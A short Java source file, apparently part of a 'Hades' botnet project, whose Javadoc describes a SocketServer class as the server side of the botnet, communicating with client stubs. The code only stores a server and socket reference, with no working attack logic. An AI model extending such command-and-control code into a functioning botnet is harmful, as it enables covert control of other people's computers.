package net.hadesbot.server.socket;

import jdk.nashorn.internal.objects.annotations.Getter;
import net.hadesbot.server.Server;

import java.net.Socket;

/**
 * The SocketServer class represents the server-side socket operations of the botnet system.
 * It handles incoming connections and manages communication with the client stubs.
 *
 * @author Hades Development
 * @project Hades
 * @date 5/27/2023
 */

public class SocketServer {

    public final Server server;
    public final Socket socket;

    public SocketServer(Server server, Socket socket) {
        this.server = server;
        this.socket = socket;
    }

}
